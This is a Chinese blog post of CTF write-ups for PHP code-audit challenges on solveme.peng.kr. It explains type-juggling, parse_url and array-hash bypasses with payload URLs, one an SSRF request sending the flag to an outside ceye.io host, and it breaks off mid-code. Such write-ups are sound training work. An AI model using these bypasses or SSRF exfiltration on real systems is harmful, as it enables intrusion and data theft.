<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> solveme.peng.kr平台Web练习 · Uknow - Stay hungry Stay foolish</title><meta name="description" content="solveme.peng.kr平台Web练习 - uknow"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/2.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" type="text/css"></head><body><div id="mask" style="display: none;"><img id="mask-image" src="#" style=" "></div><div class="wrap"><header><a href="/" class="logo-link"><img src="/2.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">Blog</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">Archive</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">About</a></li><li class="nav-list-item"><a href="https://github.com/uknowsec" target="_blank" class="nav-list-link">GitHub</a></li><li class="nav-list-item"><a href="http://weibo.com/uknowsec" target="_blank" class="nav-list-link">Weibo</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">solveme.peng.kr平台Web练习</h1><div class="post-time">Mar 31, 2018</div><div class="post-content"><!-- ttoc -->
<h2><span id="前言">前言</span></h2><p>最近自己的状态有点迷的，想学点代码审计的东西，又感觉自己的基础太菜。整个人昏昏沉沉的，偶尔逛freebuf看到一篇web题解的文章，</p>
<p>作者在文章提到这个网站的Web题都是PHP审计的题目，于是看看代码，一行一行看代码，一个函数一个函数的理解。也写个题解记录以下。</p>
<h2><span id="正文">正文</span></h2><h3><span id="warm-up">Warm up</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;;</span><br><span class="line"></span><br><span class="line">    echo base64_encode(hex2bin(strrev(bin2hex($flag)))), &apos;&lt;hr&gt;&apos;;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>第一题是解密的题目，一个函数一个函数的理解。</p>
<ul>
<li><p>bin2hex() 函数把 ASCII 字符的字符串转换为十六进制值。</p>
</li>
<li><p>strrev() 函数反转字符串。</p>
</li>
<li><p>hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符。</p>
</li>
<li><p>base64_encode() 使用 MIME base64 对数据进行编码。</p>
</li>
</ul>
<p>理解函数的意思，只需要把输出值逆向回去就行了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	</span><br><span class="line">	$flag = &quot;1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY=&quot;;</span><br><span class="line">	</span><br><span class="line">    echo hex2bin(strrev(bin2hex(base64_decode($flag))));</span><br></pre></td></tr></table></figure>
<h3><span id="bad-compare">Bad compare</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&apos;answer&apos;]))&#123;</span><br><span class="line"></span><br><span class="line">        if($_GET[&apos;answer&apos;] === &apos;痤迈愈羼滋&apos;)&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &apos;Wrong answer&apos;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        echo &apos;&lt;hr&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>以上是我用firefox浏览器打开显示的代码，我这里直接提交</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://badcompare.solveme.peng.kr/?answer=痤迈愈羼滋</span><br></pre></td></tr></table></figure>
<p>是可以的，但是在chrome不行。显示的值也不一样。</p>
<h3><span id="winter-sleep">Winter sleep</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&apos;time&apos;]))&#123;</span><br><span class="line"></span><br><span class="line">        if(!is_numeric($_GET[&apos;time&apos;]))&#123;</span><br><span class="line">            echo &apos;The time must be number.&apos;;</span><br><span class="line"></span><br><span class="line">        &#125;else if($_GET[&apos;time&apos;] &lt; 60 * 60 * 24 * 30 * 2)&#123;</span><br><span class="line">            echo &apos;This time is too short.&apos;;</span><br><span class="line"></span><br><span class="line">        &#125;else if($_GET[&apos;time&apos;] &gt; 60 * 60 * 24 * 30 * 3)&#123;</span><br><span class="line">            echo &apos;This time is too long.&apos;;</span><br><span class="line"></span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            sleep((int)$_GET[&apos;time&apos;]);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        echo &apos;&lt;hr&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>看代码的意思是让我们输入一个5184000到7776000之间的数，才能通过判断输出$flag。</p>
<p>但是在最后他会执行sleep函数</p>
<ul>
<li>sleep() 函数延迟代码执行若干秒。</li>
</ul>
<p>这个函数需要等待很长的时间，sleep用到(int)转换为整数型</p>
<p>在PHP中做如下实验</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	</span><br><span class="line">	echo 60 * 60 * 24 * 30 * 2 ,&apos;&lt;br&gt;&apos;;		//5184000</span><br><span class="line">	</span><br><span class="line">	echo 60 * 60 * 24 * 30 * 3,&apos;&lt;br&gt;&apos;	;	//7776000</span><br><span class="line">	</span><br><span class="line">	echo (int)&apos;123abc&apos; ,&apos;&lt;br&gt;&apos;;		//123</span><br><span class="line">	</span><br><span class="line">	echo (int)&apos;1abc23&apos; ,&apos;&lt;br&gt;&apos;;			//1</span><br><span class="line">	</span><br><span class="line">	echo (int)&apos;abc123&apos; ,&apos;&lt;br&gt;&apos;;			//0</span><br><span class="line">	</span><br><span class="line">	echo 6e6 ,&apos;&lt;br&gt;&apos;;		//6000000</span><br><span class="line">	</span><br><span class="line">	echo (int)&apos;6e6&apos;;		//6</span><br></pre></td></tr></table></figure>
<p>从上面代码可以看出，(int)将字符串转换成了int型，比如第三行，将123abc输出为123，第四行把1abc23输出为1。第五行把abc123输出为123</p>
<p>这里我们就可以知道(int)只取字符串中的数字，且只取第一个出现字母前的数字。</p>
<p>所以这里我们可以用科学计数法，6e6这个刚好满足代码的逻辑。</p>
<p>sleep也之执行6秒</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload : http://wintersleep.solveme.peng.kr/?time=6e6</span><br></pre></td></tr></table></figure>
<h3><span id="hard-login">Hard login</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    session_start();</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&apos;username&apos;], $_GET[&apos;password&apos;]))&#123;</span><br><span class="line"></span><br><span class="line">        if(isset($_SESSION[&apos;hard_login_check&apos;]))&#123;</span><br><span class="line">            echo &apos;Already logged in..&apos;;</span><br><span class="line"></span><br><span class="line">        &#125;else if(!isset($_GET[&apos;username&apos;]&#123;3&#125;) || strtolower($_GET[&apos;username&apos;]) != $hidden_username)&#123;</span><br><span class="line">            echo &apos;Wrong username..&apos;;</span><br><span class="line"></span><br><span class="line">        &#125;else if(!isset($_GET[&apos;password&apos;]&#123;7&#125;) || $_GET[&apos;password&apos;] != $hidden_password)&#123;</span><br><span class="line">            echo &apos;Wrong password..&apos;;</span><br><span class="line"></span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $_SESSION[&apos;hard_login_check&apos;] = true;</span><br><span class="line">            echo &apos;Login success!&apos;;</span><br><span class="line">            header(&apos;Location: ./&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        echo &apos;&lt;hr&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>这里看源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_GET[&apos;username&apos;]&#123;3&#125;		//取username提交参数的索引号为3的值</span><br><span class="line">	</span><br><span class="line">$_GET[&apos;password&apos;]&#123;7&#125;		//取username提交参数的索引号为7的值</span><br></pre></td></tr></table></figure>
<ul>
<li>strtolower() 函数把字符串转换为小写。</li>
</ul>
<p>满足上面代码给出的条件，最后是会跳转到根目录下。</p>
<p>那我们直接访问网站的根目录，显示是调转到/login.php的。</p>
<p>试试curl或者burpsuite试试。这里在windows下不自带curl命令的，我们可以用windows的git bash</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://hardlogin.solveme.peng.kr/</span><br></pre></td></tr></table></figure>
<p>这样就可以看到根目录下的源码，发现flag</p>
<h3><span id="url-filtering">URL filtering</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&quot;/lib.php&quot;;</span><br><span class="line"></span><br><span class="line">    $url = urldecode($_SERVER[&apos;REQUEST_URI&apos;]);</span><br><span class="line">    $url_query = parse_url($url, PHP_URL_QUERY);</span><br><span class="line"></span><br><span class="line">    $params = explode(&quot;&amp;&quot;, $url_query);</span><br><span class="line">    foreach($params as $param)&#123;</span><br><span class="line"></span><br><span class="line">        $idx_equal = strpos($param, &quot;=&quot;);</span><br><span class="line">        if($idx_equal === false)&#123;</span><br><span class="line">            $key = $param;</span><br><span class="line">            $value = &quot;&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $key = substr($param, 0, $idx_equal);</span><br><span class="line">            $value = substr($param, $idx_equal + 1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(strpos($key, &quot;do_you_want_flag&quot;) !== false || strpos($value, &quot;yes&quot;) !== false)&#123;</span><br><span class="line">            die(&quot;no hack&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&apos;do_you_want_flag&apos;]) &amp;&amp; $_GET[&apos;do_you_want_flag&apos;] == &quot;yes&quot;)&#123;</span><br><span class="line">        die($flag);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>代码函数理解</p>
<ul>
<li>urldecode — 解码已编码的 URL 字符串</li>
<li>parse_url — 解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分。</li>
<li>$_SERVER[‘REQUEST_URI’] - 获取域名后面的值，包括/</li>
<li>explode - 把字符串打散为数组。 explode(separator,string,limit) separator表示在哪里分割字符串，string要分割的字符串,limit可选，规定所返回的数组元素的数目。</li>
<li>strpos - 查找字符串在另一字符串中第一次出现的位置，对大小写敏感。</li>
<li>substr - 函数返回字符串的一部分。</li>
</ul>
<p>由代码的后半部分中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&apos;do_you_want_flag&apos;]) &amp;&amp; $_GET[&apos;do_you_want_flag&apos;] == &quot;yes&quot;)&#123;</span><br><span class="line">    die($flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里要求我们提交do_you_want_flag=yes去获取flag，但是前半部分由会判断的。</p>
<p>前半段代码中的key值最后为do_you_want_flag,value值为yes。显然是不能过判断的。</p>
<p>这里用到一个函数的漏洞，那就是parse_url()函数。当我们在url中的目前多加一个<code>/</code>时，他会返回flase。</p>
<p>这样我们就可以绕过前面的判断。例如这题。我们提交payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://urlfiltering.solveme.peng.kr//?do_you_want_flag=yes</span><br></pre></td></tr></table></figure>
<p>另解：</p>
<blockquote>
<p>URL filtering那题，其实感觉上，<code>///</code>这种解法是非预期的。</p>
<p>根据官方给出的wp，其实可以回来看到题目里有一步多余的url_decode操作，官方wp给出的解法是通过注入%23，使上下获取到的查询字串不对称，从而拿到flag，从代码看来的话，官方wp与题目中的提示更契合。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://urlfiltering.solveme.peng.kr/?%23do_you_want_flag=yes</span><br></pre></td></tr></table></figure>
<h2><span id="hash-collision">Hash collision</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&apos;foo&apos;], $_GET[&apos;bar&apos;]))&#123;</span><br><span class="line"></span><br><span class="line">        if(strlen($_GET[&apos;foo&apos;]) &gt; 30 || strlen($_GET[&apos;bar&apos;]) &gt; 30)&#123;</span><br><span class="line">            die(&apos;Too long&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if($_GET[&apos;foo&apos;] === $_GET[&apos;bar&apos;])&#123;</span><br><span class="line">            die(&apos;Same value&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(hash(&apos;sha512&apos;, $_GET[&apos;foo&apos;]) !== hash(&apos;sha512&apos;, $_GET[&apos;bar&apos;]))&#123;</span><br><span class="line">            die(&apos;Different hash&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        echo $flag, &apos;&lt;hr&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>代码函数理解：</p>
<ul>
<li>strlen - 函数返回字符串的长度。</li>
<li>string hash ( string $algo , string $data [, bool $raw_output = false ] ) algo 要使用的哈希算法 data 要进行哈希运算的消息</li>
</ul>
<p>这里需要两个不同值的hash相等来通过判断，但是在PHP中可以用数组进行绕过。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hashcollision.solveme.peng.kr/?foo[]=1&amp;bar[]=2</span><br></pre></td></tr></table></figure>
<h2><span id="array2string">Array2String</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;;</span><br><span class="line"></span><br><span class="line">    $value = $_GET[&apos;value&apos;];</span><br><span class="line"></span><br><span class="line">    $username = $_GET[&apos;username&apos;];</span><br><span class="line">    $password = $_GET[&apos;password&apos;];</span><br><span class="line"></span><br><span class="line">    for ($i = 0; $i &lt; count($value); ++$i) &#123;</span><br><span class="line">        if ($_GET[&apos;username&apos;]) unset($username);</span><br><span class="line">        if ($value[$i] &gt; 32 &amp;&amp; $value[$i] &lt; 127) unset($value);</span><br><span class="line">        else $username .= chr($value[$i]);</span><br><span class="line"></span><br><span class="line">        if ($username == &apos;15th_HackingCamp&apos; &amp;&amp; md5($password) == md5(file_get_contents(&apos;./secret.passwd&apos;))) &#123;</span><br><span class="line">            echo &apos;Hello &apos;.$username.&apos;!&apos;, &apos;&lt;br&gt;&apos;, PHP_EOL;</span><br><span class="line">            echo $flag, &apos;&lt;hr&gt;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>代码函数理解：</p>
<ul>
<li>unset — 释放给定的变量</li>
<li>chr - 函数从指定的 ASCII 值返回字符。</li>
</ul>
<p>看以上代码，可以看出这里的<code>$username</code>是通过<code>$value</code>拼接出来的，这里我们就需要用value拼接出<code>15th_HackingCamp</code></p>
<p>这里还规定了ASCII值不能在32-127这个范围内。</p>
<p>在PHP中，chr有以下特性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Note that if the number is higher than 256, it will return the number mod 256.</span><br><span class="line">For example :</span><br><span class="line">chr(321)=A because A=65(256)</span><br></pre></td></tr></table></figure>
<p>所以用以下脚本生成一个payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$username = &apos;15th_HackingCamp&apos;;</span><br><span class="line">	$arr = str_split($username);</span><br><span class="line">	</span><br><span class="line">	foreach($arr as $value)&#123;</span><br><span class="line">		$value = ord($value) + 256;</span><br><span class="line">		$payload .= &apos;value[]=&apos; . $value . &apos;&amp;&apos;;</span><br><span class="line">	&#125; </span><br><span class="line">	echo $payload .= &apos;password=simple_passw0rd&apos;;</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value[]=305&amp;value[]=309&amp;value[]=372&amp;value[]=360&amp;value[]=351&amp;value[]=328&amp;value[]=353&amp;value[]=355&amp;value[]=363&amp;value[]=361&amp;value[]=366&amp;value[]=359&amp;value[]=323&amp;value[]=353&amp;value[]=365&amp;value[]=368&amp;password=simple_passw0rd</span><br></pre></td></tr></table></figure>
<h2><span id="give-me-a-link">Give me a link</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&apos;url&apos;]))&#123;</span><br><span class="line">        $url = $_GET[&apos;url&apos;];</span><br><span class="line"></span><br><span class="line">        if(preg_match(&apos;/_|\s|\0/&apos;, $url))&#123;</span><br><span class="line">            die(&apos;Not allowed character&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!preg_match(&apos;/^https?\:\/\/&apos;.$_SERVER[&apos;HTTP_HOST&apos;].&apos;/i&apos;, $url))&#123;</span><br><span class="line">            die(&apos;Not allowed URL&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $parse = parse_url($url);</span><br><span class="line">        if($parse[&apos;path&apos;] !== &apos;/plz_give_me&apos;)&#123;</span><br><span class="line">            die(&apos;Not allowed path&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $parse[&apos;scheme&apos;].&apos;://&apos;.$parse[&apos;host&apos;].&apos;/&apos;.$flag);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);</span><br><span class="line">        curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        echo &apos;Okay, I sent the flag.&apos;, &apos;&lt;hr&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>代码中用了三个preg_match函数进行过滤</p>
<ul>
<li>第一个过滤了下划线</li>
<li>第二个限制<code>$_SERVER[&#39;HTTP_HOST&#39;]</code>,并且抓包不允许修改HOST</li>
<li>第三个parse_url解析后路径需为/plz_give_me</li>
</ul>
<p>显然第三个和第一个是矛盾的。但是在官方手册上，parse_url有一个</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url</span><br><span class="line">要解析的 URL。无效字符将使用 _ 来替换。</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	$url = urldecode(&quot;https://uknowsec.cn/%11test%11&quot;);</span><br><span class="line">	var_dump(parse_url($url));</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">输出：</span><br><span class="line">array(3) &#123; [&quot;scheme&quot;]=&gt;  string(4) &quot;http&quot; [&quot;host&quot;]=&gt;  string(11) &quot;uknowsec.cn&quot; [&quot;path&quot;]=&gt;  string(7) &quot;/_test_&quot; &#125;</span><br></pre></td></tr></table></figure>
<p>这样我们就可以绕过第三个和第一个过滤了。</p>
<p>但是我们提交</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://givemealink.solveme.peng.kr/?url=http://givemealink.solveme.peng.kr/plz%11give%11me</span><br></pre></td></tr></table></figure>
<p>没有回显是得不到flag的，如何解决Host的问题在官方手册中还有这样一句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$url = &apos;http://username:password@hostname:9090/path?arg=value#anchor&apos;;</span><br></pre></td></tr></table></figure>
<p>所以Host的值我们可以构造</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">givemealink.solveme.peng.kr@hostname</span><br></pre></td></tr></table></figure>
<p>我们可以用CEYE.IO来得到flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://givemealink.solveme.peng.kr/?url=http://givemealink.solveme.peng.kr@test.xxx.ceye.io/plz%1agive%1ame</span><br></pre></td></tr></table></figure>
<h2><span id="give-me-a-link">Give me a link</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&apos;url&apos;]))&#123;</span><br><span class="line">        $url = $_GET[&apos;url&apos;];</span><br><span class="line"></span><br><span class="line">        if(preg_match(&apos;/_|\s|\0/&apos;, $url))&#123;</span><br><span class="line">            die(&apos;Not allowed character&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $parse = parse_url($url);</span><br><span class="line">        if(!preg_match(&apos;/^https?$/i&apos;, $parse[&apos;scheme&apos;]))&#123;</span><br><span class="line">            die(&apos;Not allowed scheme&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!preg_match(&apos;/^(localhost|127\.\d+\.\d+\.\d+|[^.]+)(\:\d+)?$/i&apos;, $parse[&apos;host&apos;]))&#123;</span><br><span class="line">            die(&apos;Not allowed host&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!preg_match(&apos;/\/plz_give_me$/&apos;, $parse[&apos;path&apos;]))&#123;</span><br><span class="line">            die(&apos;Not allowed path&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);</span><br><span class="line">        if($socket === false)&#123;</span><br><span 